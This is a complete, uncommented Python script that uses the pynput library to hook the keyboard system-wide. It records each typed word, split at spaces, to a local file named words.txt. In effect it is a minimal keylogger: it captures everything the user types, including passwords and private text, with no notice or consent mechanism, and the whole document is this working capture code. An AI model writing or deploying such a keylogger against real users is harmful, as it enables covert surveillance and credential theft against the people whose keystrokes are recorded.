import pynput

word = ""

def on_press(key):
    global word
    if pynput.keyboard.Key.space == key:
        with open("words.txt", "a") as doc:
            doc.write("{}\n".format(word))
        word = ""
    else:
        try:
            word += str(key.char)
        except AttributeError:
            pass

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()